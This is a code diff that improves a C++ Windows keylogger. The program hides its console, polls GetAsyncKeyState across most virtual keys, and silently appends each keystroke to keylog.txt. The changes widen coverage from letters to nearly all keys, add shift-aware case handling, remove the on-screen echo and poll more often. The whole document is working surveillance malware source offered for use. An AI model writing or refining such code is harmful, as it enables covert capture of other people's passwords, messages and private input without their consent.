@@ -1,9 +1,8 @@
 #include <iostream>
 #include <fstream>
 #include <windows.h>
+#include <cctype>
 
-bool key_state[256] = {false}; // array to track key states
-char key_char = ' ';
 
 void hideConsole(){
     // get the console window handle
@@ -17,47 +16,50 @@ void hideConsole(){
 
 int main(){
 
+    bool key_state[256] = {true}; // array to track key states
+    char key_char = ' ';
+    
+
     hideConsole();
 
     std::ofstream keylog("keylog.txt", std::ios::app); // open or create a text file in append mode
 
     // if the file didn't open, shut the program down
     if (!keylog.is_open()){
-        return 1;
+        exit(1);
     }
 
     // loop to continuously track key inputs
     while (true) {
 
         // check each key
-        for (int key = 65; key <= 90; key++) {
+        for (int key = 1; key <= 135; key++) {
 
             // check if key pressed
-            if (GetAsyncKeyState(key) == -32767 ) {
+            if (GetAsyncKeyState(key) & 0x8000) {
                 
-                // Check if the key was not already registered as pressed
-                if (!key_state[key]) {
-
-                    key_char = MapVirtualKey(key, 2); 
-                    
-                    keylog << key_char;
-                    keylog.flush(); // flush the output to the file
-
-                    std::cout << key_char << std::endl;
-
-                    key_state[key] = true;
+                if (key_state[key]) {
+                    continue; // skip this key if already pressed
                 }
+
+                key_char = MapVirtualKey(key, 2);
+                
+                if (!key_state[VK_SHIFT]) { keylog << (char) tolower(key_char);}
+                else{ keylog << key_char;}
+                
+                keylog.flush(); // flush the output to the file
+
+                key_state[key] = true; // update key state
             } else {
-                // update the key state if not pressed
-                key_state[key] = false;
+                key_state[key] = false; // update key state 
             }   
         }
-        // Add a delay to avoid high CPU usage
-        Sleep(100);
+
+        // delay to avoid high CPU usage
+        Sleep(10);
     } 
 
     keylog.close();
-   
 
     return 0;
 }
